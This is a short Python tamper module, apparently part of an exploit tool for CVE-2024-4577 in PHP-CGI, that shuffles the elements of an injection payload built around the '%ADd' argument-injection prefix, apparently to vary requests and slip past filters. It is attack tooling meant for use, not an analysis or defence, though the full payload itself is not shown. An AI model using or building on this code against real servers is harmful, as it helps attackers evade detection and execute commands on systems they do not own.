# tamper_payload_shuffle.py
import random
from exploit import PAYLOAD_ELEMENTS, CVE_PREFIXES

name = "tamper_payload_shuffle"
description = "打亂 payload 中的元素順序"

def tamper(data):
    cve = data.get("cve_id", "CVE-2024-4577")
    prefix = CVE_PREFIXES.get(cve, "%ADd")
    payload = data.get("payload", "")

    # 將 payload 切割為 prefix 組合項
    parts = payload.split("+")
    payload_chunks = []

    for i in range(0, len(parts), 2):
        if i + 1 < len(parts):
            pair = f"{parts[i]}+{parts[i+1]}"
            payload_chunks.append(pair)

    if not payload_chunks:
        return data

    random.shuffle(payload_chunks)
    data["payload"] = "+".join(payload_chunks)
    return data
